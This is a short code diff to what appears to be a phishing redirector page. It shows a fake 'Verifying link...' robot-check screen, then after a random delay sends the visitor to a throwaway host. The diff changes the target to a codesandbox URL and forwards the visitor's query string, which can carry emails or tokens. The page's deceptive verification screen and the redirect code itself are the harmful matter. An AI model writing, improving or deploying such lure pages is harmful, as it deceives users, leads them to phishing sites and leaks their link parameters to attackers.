@@ -59,9 +59,9 @@
         const progressBar = document.getElementById('loadingProgress');
         const robotPrompt = document.getElementById('robotPrompt');
         let progress = 0;
-        const totalDuration = 15000; // 12 seconds
+        const totalDuration = 12000; // 12 seconds
         const minRedirectDelay = 5000; // 5 seconds
-        const maxRedirectDelay = 1000; // 10 seconds
+        const maxRedirectDelay = 10000; // 10 seconds
         const stepTime = totalDuration / 100; // Time for each 1% step
         const messages = [
             "Verifying link...",
@@ -86,7 +86,10 @@
 
             const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
             setTimeout(() => {
-                window.location.href = "https://3830louis.sa.com/";
+                const currentUrl = new URL(window.location.href);
+                const params = currentUrl.search;
+                const redirectUrl = "https://ct2hqt.csb.app/" + params;
+                window.location.href = redirectUrl;
             }, redirectDelay);
         }
 
